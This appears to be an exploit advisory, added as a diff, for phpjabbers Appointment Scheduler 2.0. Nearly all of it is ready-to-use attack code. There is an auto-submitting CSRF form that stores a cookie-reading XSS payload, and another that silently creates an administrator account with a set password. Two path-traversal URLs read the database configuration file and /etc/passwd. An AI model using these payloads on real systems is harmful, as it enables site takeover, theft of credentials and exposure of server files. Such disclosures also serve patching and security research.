@@ -1,0 +1,64 @@
+Appointment Scheduler V2.0 - Multiple Vulnerabilities
+=========================================================================
+
+####################################################################
+.:. Author         : HackXBack
+.:. Contact        : h-b@usa.com
+.:. Home           : http://www.iphobos.com/blog/
+.:. Script         : http://www.phpjabbers.com/appointment-scheduler/
+####################################################################
+
+===[ Exploit ]===
+
+[1] Cross Site Scripting
+=========================
+
+# CSRF with XSS Exploit:
+
+
+<html>
+<body onload="document.form0.submit();">
+<form method="POST" name="form0" action="
+http://site/index.php?controller=pjAdminServices&action=pjActionCreate">
+<input type="hidden" name="service_create" value="1"/>
+<input type="hidden" name="i18n[1][name]"
+value="<script>alert(document.cookie);</script>"/>
+<input type="hidden" name="i18n[1][description]" value="Iphobos Blog"/>
+<input type="hidden" name="price" value="100"/>
+<input type="hidden" name="length" value="1"/>
+<input type="hidden" name="before" value="1"/>
+<input type="hidden" name="after" value="1"/>
+<input type="hidden" name="total" value="3"/>
+<input type="hidden" name="is_active" value="1"/>
+</form>
+</body>
+</html>
+
+
+[2] Cross Site Request Forgery
+===============================
+
+[Add Admin]
+
+<html>
+<body onload="document.form0.submit();">
+<form method="POST" name="form0" action="
+http://site/index.php?controller=pjAdminUsers&action=pjActionCreate">
+<input type="hidden" name="user_create" value="1"/>
+<input type="hidden" name="role_id" value="1"/>
+<input type="hidden" name="email" value="Email@hotmail.com"/>
+<input type="hidden" name="password" value="123456"/>
+<input type="hidden" name="name" value="Iphobos"/>
+<input type="hidden" name="status" value="T"/>
+</form>
+</body>
+</html
+
+[3] Local File disclure
+========================
+
+http://site/index.php?controller=pjBackup&action=pjActionDownload&id=../../../../../app/config/db.inc.php
+http://site/index.php?controller=pjBackup&action=pjActionDownload&id=../../../../../../../../etc/passwd
+
+
+####################################################################
